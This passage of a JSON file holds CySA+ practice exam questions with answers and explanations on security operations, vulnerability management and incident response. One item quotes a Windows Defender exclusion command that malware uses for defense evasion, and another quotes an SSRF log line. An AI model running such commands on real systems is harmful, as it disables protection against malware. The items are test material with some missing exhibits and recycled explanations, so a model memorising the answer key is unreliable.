      "C. The firewall certificate expired.",
      "D. The firewall failed open."
    ],
    "answer": "C",
    "explanation": "The firewall certificate expired. If the firewall uses a certificate to authenticate and encrypt the feed,\nand the certificate expires, the feed will stop working until the certificate is renewed or replaced.\nThis can affect the data enrichment process and the security analysis. Reference: CompTIA CySA+\nStudy Guide: Exam CS0-003, 3rd Edition, Chapter 4: Security Operations and Monitoring, page 161.",
    "image": null
  },
  {
    "id": "q-jc-205",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst noticed the following entry on a web server log:\nWarning: fopen (http://127.0.0.1:16) : failed to open stream:\nConnection refused in /hj/var/www/showimage.php on line 7\nWhich of the following malicious activities was most likely attempted?",
    "options": [
      "A. XSS",
      "B. CSRF",
      "C. SSRF",
      "D. RCE"
    ],
    "answer": "C",
    "explanation": "The malicious activity that was most likely attempted is SSRF (Server-Side Request Forgery). This is a\ntype of attack that exploits a vulnerable web application to make requests to other resources on\nbehalf of the web server. In this case, the attacker tried to use the fopen function to access the local\nloopback address (127.0.0.1) on port 16, which could be a service that is not intended to be exposed\nto the public. The connection was refused, indicating that the port was closed or filtered. Reference:\nCompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 2: Software and Application\nSecurity, page 66.",
    "image": null
  },
  {
    "id": "q-jc-206",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A SOC analyst is analyzing traffic on a network and notices an unauthorized scan. Which of the\nfollowing types of activities is being observed?",
    "options": [
      "A. Potential precursor to an attack",
      "B. Unauthorized peer-to-peer communication",
      "C. Rogue device on the network",
      "D. System updates"
    ],
    "answer": "A",
    "explanation": "An unauthorized network scan is classified as a 'potential precursor to an attack' (A). In the NIST and MITRE ATT&CK frameworks, network scanning/reconnaissance is the first stage in the attack lifecycle — an adversary gathers information about live hosts, open ports, and services before launching exploitation. The fact that it is unauthorized and internal raises the suspicion of an insider threat or a compromised internal host. Option B (peer-to-peer communication) involves direct device-to-device traffic without a server. Option C (rogue device) requires device authentication anomalies. Option D (system updates) generates known update traffic patterns, not scanning activity.",
    "image": null
  },
  {
    "id": "q-jc-207",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is evaluating a vulnerability management dashboard. The analyst sees that a previously\nremediated vulnerability has reappeared on a database server. Which of the following is the most\nlikely cause?",
    "options": [
      "A. The finding is a false positive and should be ignored.",
      "B. A rollback had been executed on the instance.",
      "C. The vulnerability scanner was configured without credentials.",
      "D. The vulnerability management software needs to be updated."
    ],
    "answer": "B",
    "explanation": "A rollback had been executed on the instance. If a database server is restored to a previous state, it\nmay reintroduce a vulnerability that was previously fixed. This can happen due to backup and\nrecovery operations, configuration changes, or software updates. A rollback can undo the patching or\nmitigation actions that were applied to remediate the vulnerability. Reference: Vulnerability\nRemediation: It’s Not Just Patching, Section: The Remediation Process; Vulnerability assessment for\nSQL Server, Section: Remediation",
    "image": null
  },
  {
    "id": "q-jc-208",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A Chief Information Security Officer has outlined several requirements for a new vulnerability\nscanning project:\n. Must use minimal network bandwidth\n. Must use minimal host resources\n. Must provide accurate, near real-time updates\n. Must not have any stored credentials in configuration on the scanner\nWhich of the following vulnerability scanning methods should be used to best meet these\nrequirements?",
    "options": [
      "A. Internal",
      "B. Agent",
      "C. Active",
      "D. Uncredentialed"
    ],
    "answer": "B",
    "explanation": "Agent-based vulnerability scanning is a method that uses software agents installed on the target\nsystems to scan for vulnerabilities. This method meets the requirements of the project because it\nuses minimal network bandwidth and host resources, provides accurate and near real-time updates,\nand does not require any stored credentials on the scanner. Reference: What Is Vulnerability\nScanning? Types, Tools and Best Practices, Section: Types of vulnerability scanning; CompTIA CySA+\nStudy Guide: Exam CS0-003, 3rd Edition, Chapter 4: Security Operations and Monitoring, page 154.",
    "image": "images/page_162_img_2.jpeg"
  },
  {
    "id": "q-jc-209",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A vulnerability management team found four major vulnerabilities during an assessment and needs\nto provide a report for the proper prioritization for further mitigation. Which of the following\nvulnerabilities should have the highest priority for the mitigation process?",
    "options": [
      "A. A vulnerability that has related threats and loCs, targeting a different industry",
      "B. A vulnerability that is related to a specific adversary campaign, with loCs found in the SIEM",
      "C. A vulnerability that has no adversaries using it or associated loCs",
      "D. A vulnerability that is related to an isolated system, with no loCs"
    ],
    "answer": "B",
    "explanation": "A vulnerability that is related to a specific adversary campaign, with IoCs found in the SIEM, should\nhave the highest priority for the mitigation process. This is because it indicates that the vulnerability\nis actively being exploited by a known threat actor, and that the organization’s security monitoring\nsystem has detected signs of compromise. This poses a high risk of data breach, service disruption, or\nother adverse impacts. Reference: How to Prioritize Vulnerabilities Effectively: Vulnerability\nPrioritization Explained, Section: How to prioritize vulnerabilities step by step to avoid drowning in\nsea of problems; CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 4: Security\nOperations and Monitoring, page 156.",
    "image": "images/page_162_img_2.jpeg"
  },
  {
    "id": "q-jc-210",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is reviewing events that occurred during a possible compromise. The analyst\nobtains the following log:\nWhich of the following is most likely occurring, based on the events in the log?",
    "options": [
      "A. An adversary is attempting to find the shortest path of compromise.",
      "B. An adversary is performing a vulnerability scan.",
      "C. An adversary is escalating privileges.",
      "D. An adversary is performing a password stuffing attack.\n."
    ],
    "answer": "B",
    "explanation": "Based on the events in the log, the most likely occurrence is that an adversary is performing a\nvulnerability scan. The log shows LDAP read operations and EDR enumerating local groups, which are\nindicative of an adversary scanning the system to find vulnerabilities or sensitive information. The\nfinal entry shows SMB connection attempts to multiple hosts from a single host, which could be a\nsign of network discovery or lateral movement. Reference: CompTIA CySA+ Study Guide: Exam CS0-\n003, 3rd Edition, Chapter 4: Security Operations and Monitoring, page 161; Monitor logs from\nvulnerability scanners, Section: Reports on Nessus vulnerability data.",
    "image": "images/page_162_img_2.jpeg"
  },
  {
    "id": "q-jc-211",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "AXSS vulnerability was reported on one of the non-sensitive/non-mission-critical public websites of a\ncompany. The security department confirmed the finding and needs to provide a recommendation to\nthe application owner. Which of the following recommendations will best prevent this vulnerability\nfrom being exploited? (Select two).",
    "options": [
      "A. Implement an IPS in front of the web server.",
      "B. Enable MFA on the website.",
      "C. Take the website offline until it is patched.",
      "D. Implement a compensating control in the source code.",
      "E. Configure TLS v1.3 on the website.",
      "F. Fix the vulnerability using a virtual patch at the WAF."
    ],
    "answer": [
      "D",
      "F"
    ],
    "explanation": "The best recommendations to prevent an XSS vulnerability from being exploited are to implement a\ncompensating control in the source code and to fix the vulnerability using a virtual patch at the WAF.\nA compensating control is a technique that mitigates the risk of a vulnerability by adding additional\nsecurity measures, such as input validation, output encoding, or HTML sanitization. A virtual patch is\na rule that blocks or modifies malicious requests or responses at the WAF level, without modifying\nthe application code. These recommendations are effective, efficient, and less disruptive than the\nother options. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 4:\nSecurity Operations and Monitoring, page 156; Cross Site Scripting Prevention Cheat Sheet, Section:\nXSS Defense Philosophy.",
    "image": "images/page_164_img_2.jpeg"
  },
  {
    "id": "q-jc-212",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following techniques can help a SOC team to reduce the number of alerts related to the\ninternal security activities that the analysts have to triage?",
    "options": [
      "A. Enrich the SIEM-ingested data to include all data required for triage.",
      "B. Schedule a task to disable alerting when vulnerability scans are executing.",
      "C. Filter all alarms in the SIEM with low severity.",
      "D. Add a SOAR rule to drop irrelevant and duplicated notifications."
    ],
    "answer": "D",
    "explanation": "Adding a SOAR (Security Orchestration, Automation, and Response) rule to drop irrelevant and duplicated notifications (D) is the correct approach to reduce alert fatigue from known internal security activities. SOAR allows precise, policy-driven suppression of specific alert patterns while maintaining full visibility and auditability. Option B (disabling alerting entirely during scans) is too broad and creates blind spots. Option C (filtering low-severity alarms globally) risks missing real low-severity incidents. Option A (enriching SIEM data) improves triage quality but does not reduce alert volume.",
    "image": "images/page_164_img_2.jpeg"
  },
  {
    "id": "q-jc-213",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization has tracked several incidents that are listed in the following table:\nWhich of the\nfollowing is the organization's MTTD?",
    "options": [
      "A. 140 minutes",
      "B. 150 minutes",
      "C. 160 minutes",
      "D. 180 minutes"
    ],
    "answer": "C",
    "explanation": "The MTTD (Mean Time To Detect) is calculated by averaging the time elapsed in detecting incidents.\nFrom the given data: (180+150+170+140)/4 = 160 minutes. This is the correct answer according to\nthe CompTIA CySA+ CS0-003 Certification Study Guide1, Chapter 4, page 161. Reference: CompTIA\nCySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 4, page 153; CompTIA CySA+ CS0-003\nCertification Study Guide, Chapter 4, page 161.",
    "image": "images/page_164_img_2.jpeg"
  },
  {
    "id": "q-jc-214",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following does \"federation\" most likely refer to within the context of identity and access\nmanagement?",
    "options": [
      "A. Facilitating groups of users in a similar function or profile to system access that requires elevated\nor conditional access",
      "B. An authentication mechanism that allows a user to utilize one set of credentials to access multiple\ndomains",
      "C. Utilizing a combination of what you know, who you are, and what you have to grant authentication\nto a user",
      "D. Correlating one's identity with the attributes and associated applications the user has access to"
    ],
    "answer": "B",
    "explanation": "Federation is a system of trust between two parties for the purpose of authenticating users and\nconveying information needed to authorize their access to resources. By using federation, a user can\nuse one set of credentials to access multiple domains that trust each other.",
    "image": null
  },
  {
    "id": "q-jc-215",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During an incident involving phishing, a security analyst needs to find the source of the malicious\nemail. Which of the following techniques would provide the analyst with this information?",
    "options": [
      "A. Header analysis",
      "B. Packet capture",
      "C. SSL inspection",
      "D. Reverse engineering"
    ],
    "answer": "A",
    "explanation": "Header analysis is the technique of examining the metadata of an email, such as the sender,\nrecipient, date, subject, and routing information. It can help to identify the source of a malicious\nemail by revealing the IP address and domain name of the originator, as well as any spoofing or\nredirection attempts. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 6,\npage 240; CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 6, page 249.",
    "image": null
  },
  {
    "id": "q-jc-216",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst needs to provide evidence of regular vulnerability scanning on the company's\nnetwork for an auditing process. Which of the following is an example of a tool that can produce such\nevidence?",
    "options": [
      "A. OpenVAS",
      "B. Burp Suite",
      "C. Nmap",
      "D. Wireshark"
    ],
    "answer": "A",
    "explanation": "OpenVAS is an open-source tool that performs comprehensive vulnerability scanning and assessment\non the network. It can generate reports and evidence of the scan results, which can be used for\nauditing purposes. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5,\npage 199; CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 5, page 207.",
    "image": null
  },
  {
    "id": "q-jc-217",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An employee downloads a freeware program to change the desktop to the classic look of legacy\nWindows. Shortly after the employee installs the program, a high volume of random DNS queries\nbegin\nto originate from the system. An investigation on the system reveals the following:\nAdd-MpPreference -ExclusionPath '%Program Filest\\ksysconfig'\nWhich of the following is possibly occurring?",
    "options": [
      "A. Persistence",
      "B. Privilege escalation",
      "C. Credential harvesting",
      "D. Defense evasion"
    ],
    "answer": "D",
    "explanation": "Defense evasion is the technique of avoiding detection or prevention by security tools or\nmechanisms. In this case, the freeware program is likely a malware that generates random DNS\nqueries to communicate with a command and control server or exfiltrate data. The command Add-\nMpPreference -ExclusionPath '%Program Filest\\ksysconfig' is used to add an exclusion path to\nWindows Defender, which is a built-in antivirus software, to prevent it from scanning the malware\nfolder. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 5, page 204;\nCompTIA CySA+ CS0-003 Certification Study Guide, Chapter 5, page 212. pr",
    "image": null
  },
  {
    "id": "q-jc-218",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A cybersecurity analyst has recovered a recently compromised server to its previous state. Which of\nthe following should the analyst perform next?",
    "options": [
      "A. Eradication",
      "B. Isolation",
      "C. Reporting",
      "D. Forensic analysis"
    ],
    "answer": "D",
    "explanation": "After recovering a compromised server to its previous state, the analyst should perform forensic\nanalysis to determine the root cause, impact, and scope of the incident, as well as to identify any\nindicators of compromise, evidence, or artifacts that can be used for further investigation or\nprosecution. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition, Chapter 6, page\n244; CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 6, page 253.",
    "image": null
  },
  {
    "id": "q-jc-219",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of following would best mitigate the effects of a new ransomware attack that was not properly\nstopped by the company antivirus?",
    "options": [
      "A. Install a firewall.",
      "B. Implement vulnerability management.",
      "C. Deploy sandboxing.",
      "D. Update the application blocklist."
    ],
    "answer": "C",
    "explanation": "Sandboxing is a technique that isolates potentially malicious programs or files in a controlled\nenvironment, preventing them from affecting the rest of the system. It can help mitigate the effects\nof a new ransomware attack by preventing it from encrypting or deleting important data or\nspreading to other devices. Reference: CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition,\nChapter 5, page 202; CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 5, page 210.",
    "image": null
  },
  {
    "id": "q-jc-220",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "During an internal code review, software called \"ACE\" was discovered to have a vulnerability that\nallows the execution of arbitrary code. The vulnerability is in a legacy, third-party vendor resource\nthat is used by the ACE software. ACE is used worldwide and is essential for many businesses in this\nindustry. Developers informed the Chief Information Security Officer that removal of the vulnerability\nwill take time. Which of the following is the first action to take?",
    "options": [
      "A. Look for potential loCs in the company.",
      "B. Inform customers of the vulnerability.",
      "C. Remove the affected vendor resource from the ACE software.",
      "D. Develop a compensating control until the issue can be fixed permanently."
    ],
    "answer": "D",
    "explanation": "A compensating control is an alternative measure that provides a similar level of protection as the\noriginal control, but is used when the original control is not feasible or cost-effective. In this case, the\nCISO should develop a compensating control to mitigate the risk of the vulnerability in the ACE\nsoftware, such as implementing additional monitoring, firewall rules, or encryption, until the issue\ncan be fixed permanently by the developers. Reference: CompTIA CySA+ Study Guide: Exam CS0-003,\n3rd Edition, Chapter 5, page 197; CompTIA CySA+ CS0-003 Certification Study Guide, Chapter 5, page\n205.",
    "image": null
  },
  {
    "id": "q-jc-221",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following statements best describes the MITRE ATT&CK framework?",
    "options": [
      "A. It provides a comprehensive method to test the security of applications.",
      "B. It provides threat intelligence sharing and development of action and mitigation strategies.",
      "C. It helps identify and stop enemy activity by highlighting the areas where an attacker functions.",
      "D. It tracks and understands threats and is an open-source project that evolves.",
      "E. It breaks down intrusions into a clearly defined sequence of phases."
    ],
    "answer": "D",
    "explanation": "The MITRE ATT&CK framework is a knowledge base of cybercriminals’ adversarial behaviors based\non cybercriminals’ known tactics, techniques and procedures (TTPs). It helps security teams model,\ndetect, prevent and fight cybersecurity threats by simulating cyberattacks, creating security policies,\ncontrols and incident response plans, and sharing information with other security professionals. It is\nan open-source project that evolves with input from a global community of cybersecurity\nprofessionals1. Reference: What is the MITRE ATT&CK Framework? | IBM",
    "image": null
  },
  {
    "id": "q-jc-222",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following entities should an incident manager work with to ensure correct processes\nare adhered to when communicating incident reporting to the general public, as a best practice?\n(Select two).",
    "options": [
      "A. Law enforcement",
      "B. Governance",
      "C. Legal",
      "D. Manager",
      "E. Public relations",
      "F. Human resources"
    ],
    "answer": [
      "C",
      "E"
    ],
    "explanation": "C. Legal and E. Public relations are the two entities an incident manager must coordinate with for incident communication reporting. The Legal team ensures all communications comply with regulatory requirements (GDPR, HIPAA, PCI-DSS breach notification), advises on liability, and reviews external disclosures. Public Relations manages stakeholder and media communications to protect organizational reputation and control the narrative. Law enforcement (A) is involved in criminal investigations but not routine communication processes. Governance (B) sets policy. Management (D) and HR (F) are internal stakeholders but not the primary communication process owners.",
    "image": null
  },
  {
    "id": "q-jc-223",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst observed the following activity from a privileged account:\n. Accessing emails and sensitive information\n. Audit logs being modified\n. Abnormal log-in times\nWhich of the following best describes the observed activity?",
    "options": [
      "A. Irregular peer-to-peer communication",
      "B. Unauthorized privileges",
      "C. Rogue devices on the network",
      "D. Insider attack"
    ],
    "answer": "D",
    "explanation": "The observed activity from a privileged account indicates an insider attack, which is when a trusted\nuser or employee misuses their access rights to compromise the security of the organization.\nAccessing emails and sensitive information, modifying audit logs, and logging in at abnormal times\nare all signs of malicious behavior by a privileged user who may be trying to steal, tamper, or destroy\ndata, or cover their tracks. An insider attack can cause significant damage to the organization’s\nreputation, operations, and compliance12. Reference: The Privileged Identity Playbook Guides\nManagement of Privileged User Accounts, How to Track Privileged Users’ Activities in Active\nDirectory",
    "image": null
  },
  {
    "id": "q-jc-224",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A penetration tester submitted data to a form in a web application, which enabled the penetration\ntester to retrieve user credentials. Which of the following should be recommended for remediation\nof this application vulnerability?",
    "options": [
      "A. Implementing multifactor authentication on the server OS",
      "B. Hashing user passwords on the web application",
      "C. Performing input validation before allowing submission",
      "D. Segmenting the network between the users and the web server"
    ],
    "answer": "C",
    "explanation": "Performing input validation before allowing submission is the best recommendation for remediation\nof this application vulnerability. Input validation is a technique that checks the data entered by users\nor attackers against a set of rules or constraints, such as data type, length, format, or range. Input\nvalidation can prevent common web application attacks such as SQL injection, cross-site scripting\n(XSS), or command injection, which exploit the lack of input validation to execute malicious code or\ncommands on the server or the client side. By validating the input before allowing submission, the\nweb application can reject or sanitize any malicious or unexpected input, and protect the user\ncredentials and other sensitive data from being compromised12. Reference: Input Validation -\nOWASP, 4 Most Common Application Vulnerabilities and Possible Remediation",
    "image": null
  },
  {
    "id": "q-jc-225",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "During a security test, a security analyst found a critical application with a buffer overflow\nvulnerability. Which of the following would be best to mitigate the vulnerability at the application\nlevel?",
    "options": [
      "A. Perform OS hardening.",
      "B. Implement input validation.",
      "C. Update third-party dependencies.",
      "D. Configure address space layout randomization."
    ],
    "answer": "B",
    "explanation": "Implementing input validation is the best way to mitigate the buffer overflow vulnerability at the\napplication level. Input validation is a technique that checks the data entered by users or attackers\nagainst a set of rules or constraints, such as data type, length, format, or range. Input validation can\nprevent common web application attacks such as SQL injection, cross-site scripting (XSS), or\ncommand injection, which exploit the lack of input validation to execute malicious code or\ncommands on the server or the client side. By validating the input before allowing submission, the\nweb application can reject or sanitize any malicious or unexpected input, and protect the application\nfrom being compromised12. Reference: How to detect, prevent, and mitigate buffer overflow attacks\n- Synopsys, How to mitigate buffer overflow vulnerabilities | Infosec",
    "image": null
  },
  {
    "id": "q-jc-226",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An organization discovered a data breach that resulted in Pll being released to the public. During the\nlessons learned review, the panel identified discrepancies regarding who was responsible for external\nreporting, as well as the timing requirements. Which of the following actions would best address the\nreporting issue?",
    "options": [
      "A. Creating a playbook denoting specific SLAs and containment actions per incident type",
      "B. Researching federal laws, regulatory compliance requirements, and organizational policies to\ndocument specific reporting SLAs",
      "C. Defining which security incidents require external notifications and incident reporting in addition\nto internal stakeholders",
      "D. Designating specific roles and responsibilities within the security team and stakeholders to\nstreamline tasks"
    ],
    "answer": "B",
    "explanation": "Researching federal laws, regulatory compliance requirements, and organizational policies to\ndocument specific reporting SLAs is the best action to address the reporting issue. Reporting SLAs are\nservice level agreements that specify the time frame and the format for notifying the relevant\nauthorities and the affected individuals of a data breach. Reporting SLAs may vary depending on the\ntype and severity of the breach, the type and location of the data, the industry and jurisdiction of the\norganization, and the internal policies of the organization. By researching and documenting the\nreporting SLAs for different scenarios, the organization can ensure that it complies with the legal and\nethical obligations of data breach notification, and avoid any penalties, fines, or lawsuits that may\nresult from failing to report a breach in a timely and appropriate manner12. Reference: When and\nhow to report a breach: Data breach reporting best practices, Incident and Breach Management",
    "image": null
  },
  {
    "id": "q-jc-227",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following would an organization use to develop a business continuity plan?",
    "options": [
      "A. A diagram of all systems and interdependent applications",
      "B. A repository for all the software used by the organization",
      "C. A prioritized list of critical systems defined by executive leadership",
      "D. A configuration management database in print at an off-site location"
    ],
    "answer": "C",
    "explanation": "A prioritized list of critical systems defined by executive leadership is the best option to use to\ndevelop a business continuity plan. A business continuity plan (BCP) is a system of prevention and\nrecovery from potential threats to a company. The plan ensures that personnel and assets are\nprotected and are able to function quickly in the event of a disaster1. A BCP should include a\nbusiness impact analysis, which identifies the critical systems and processes that are essential for the\ncontinuity of the business operations, and the potential impacts of their disruption2. The executive\nleadership should be involved in defining the critical systems and their priorities, as they have the\nstrategic vision and authority to make decisions that affect the whole organization3. A diagram of all\nsystems and interdependent applications, a repository for all the software used by the organization,\nand a configuration management database in print at an off-site location are all useful tools for\ndocumenting and managing the IT infrastructure, but they are not sufficient to develop a\ncomprehensive BCP that covers all aspects of the business continuity4. Reference: What Is a Business\nContinuity Plan (BCP), and How Does It Work?, Business continuity plan (BCP) in 8 steps, with\ntemplates, Business continuity planning | Business Queensland, Understanding the Essentials of a\nBusiness Continuity Plan",
    "image": null
  },
  {
    "id": "q-jc-228",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst reviews the following results of a Nikto scan:\nWhich of the following should the security administrator investigate next?",
    "options": [
      "A. tiki",
      "B. phpList",
      "C. shtml.exe",
      "D. sshome"
    ],
    "answer": "C",
    "explanation": "The security administrator should investigate shtml.exe next, as it is a potential vulnerability that\nallows remote code execution on the web server. Nikto scan results indicate that the web server is\nrunning Apache on Windows, and that the shtml.exe file is accessible in the /scripts/ directory. This\nfile is part of the Server Side Includes (SSI) feature, which allows dynamic content generation on web\npages. However, if the SSI feature is not configured properly, it can allow attackers to execute\narbitrary commands on the web server by injecting malicious code into the URL or the web page12.\nTherefore, the security administrator should check the SSI configuration and permissions, and\nremove or disable the shtml.exe file if it is not needed. Reference: Nikto-Penetration testing.\nIntroduction, Web application scanning with Nikto",
    "image": "images/page_176_img_2.jpeg"
  },
  {
    "id": "q-jc-229",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A cybersecurity analyst is doing triage in a SIEM and notices that the time stamps between the\nfirewall and the host under investigation are off by 43 minutes. Which of the following is the most\nlikely scenario occurring with the time stamps?",
    "options": [
      "A. The NTP server is not configured on the host.",
      "B. The cybersecurity analyst is looking at the wrong information.",
      "C. The firewall is using UTC time.",
      "D. The host with the logs is offline."
    ],
    "answer": "A",
    "explanation": "The most likely scenario occurring with the time stamps is that the NTP server is not configured on\nthe host. NTP is the Network Time Protocol, which is used to synchronize the clocks of computers\nover a network. NTP uses a hierarchical system of time sources, where each level is assigned a\nstratum number. The most accurate time sources, such as atomic clocks or GPS receivers, are at\nstratum 0, and the devices that synchronize with them are at stratum 1, and so on. NTP clients can\nquery multiple NTP servers and use algorithms to select the best time source and adjust their clocks\naccordingly1. If the NTP server is not configured on the host, the host will rely on its own hardware\nclock, which may drift over time and become inaccurate. This can cause discrepancies in the time\nstamps between the host and other devices on the network, such as the firewall, which may be\nsynchronized with a different NTP server or use a different time zone. This can affect the security\nanalysis and correlation of events, as well as the compliance and auditing of the network23.\nReference: How the Windows Time Service Works, Time Synchronization - All You Need To Know,\nFirewall rules logging: a closer look at our new network compliance and …",
    "image": null
  },
  {
    "id": "q-jc-230",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Each time a vulnerability assessment team shares the regular report with other teams,\ninconsistencies regarding versions and patches in the existing infrastructure are discovered. Which of\nthe following is the best solution to decrease the inconsistencies?",
    "options": [
      "A. Implementing credentialed scanning",
      "B. Changing from a passive to an active scanning approach",
      "C. Implementing a central place to manage IT assets",
      "D. Performing agentless scanning"
    ],
    "answer": "C",
    "explanation": "Implementing a central place to manage IT assets is the best solution to decrease the inconsistencies\nregarding versions and patches in the existing infrastructure. A central place to manage IT assets,\nsuch as a configuration management database (CMDB), can help the vulnerability assessment team\nto have an accurate and up-to-date inventory of all the hardware and software components in the\nnetwork, as well as their relationships and dependencies. A CMDB can also track the changes and\nupdates made to the IT assets, and provide a single source of truth for the vulnerability assessment\nteam and other teams to compare and verify the versions and patches of the infrastructure12.\nImplementing credentialed scanning, changing from a passive to an active scanning approach, and\nperforming agentless scanning are all methods to improve the vulnerability scanning process, but\nthey do not address the root cause of the inconsistencies, which is the lack of a central place to\nmanage IT assets3. Reference: What is a Configuration Management Database (CMDB)?, How to Use\na CMDB to Improve Vulnerability Management, Vulnerability Scanning Best Practices",
    "image": null
  },
  {
    "id": "q-jc-231",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "While configuring a SIEM for an organization, a security analyst is having difficulty correlating\nincidents across different systems. Which of the following should be checked first?",
    "options": [
      "A. If appropriate logging levels are set",
      "B. NTP configuration on each system",
      "C. Behavioral correlation settings",
      "D. Data normalization rules"
    ],
    "answer": "B",
    "explanation": "The NTP configuration on each system should be checked first, as it is essential for ensuring accurate\nand consistent time stamps across different systems. NTP is the Network Time Protocol, which is\nused to synchronize the clocks of computers over a network. NTP uses a hierarchical system of time\nsources, where each level is assigned a stratum number. The most accurate time sources, such as\natomic clocks or GPS receivers, are at stratum 0, and the devices that synchronize with them are at\nstratum 1, and so on. NTP clients can query multiple NTP servers and use algorithms to select the\nbest time source and adjust their clocks accordingly1. If the NTP configuration is not consistent or\ncorrect on each system, the time stamps of the logs and events may differ, making it difficult to\ncorrelate incidents across different systems. This can affect the security analysis and correlation of\nevents, as well as the compliance and auditing of the network23. Reference: How the Windows Time\nService Works, Time Synchronization - All You Need To Know, What is SIEM? | Microsoft Security",
    "image": null
  },
  {
    "id": "q-jc-232",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is conducting routine vulnerability assessments on the company infrastructure. When\nperforming these scans, a business-critical server crashes, and the cause is traced back to the\nvulnerability scanner. Which of the following is the cause of this issue?",
    "options": [
      "A. The scanner is running without an agent installed.",
      "B. The scanner is running in active mode.",
      "C. The scanner is segmented improperly.",
      "D. The scanner is configured with a scanning window."
    ],
    "answer": "B",
    "explanation": "The scanner is running in active mode, which is the cause of this issue. Active mode is a type of\nvulnerability scanning that sends probes or requests to the target systems to test their responses and\nidentify potential vulnerabilities. Active mode can provide more accurate and comprehensive results,\nbut it can also cause more network traffic, performance degradation, or system instability. In some\ncases, active mode can trigger denial-of-service (DoS) conditions or crash the target systems,\nespecially if they are not configured to handle the scanning requests or if they have underlying\nvulnerabilities that can be exploited by the scanner12. Therefore, the analyst should use caution\nwhen performing active mode scanning, and avoid scanning business-critical or sensitive systems\nwithout proper authorization and preparation3. Reference: Vulnerability Scanning for my Server -\nSpiceworks Community, Negative Impacts of Automated Vulnerability Scanners and How … -\nAcunetix, Vulnerability Scanning Best Practices",
    "image": null
  },
  {
    "id": "q-jc-233",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst is becoming overwhelmed with the number of events that need to be investigated for a\ntimeline. Which of the following should the analyst focus on in order to move the incident forward?",
    "options": [
      "A. Impact",
      "B. Vulnerability score",
      "C. Mean time to detect",
      "D. Isolation"
    ],
    "answer": "A",
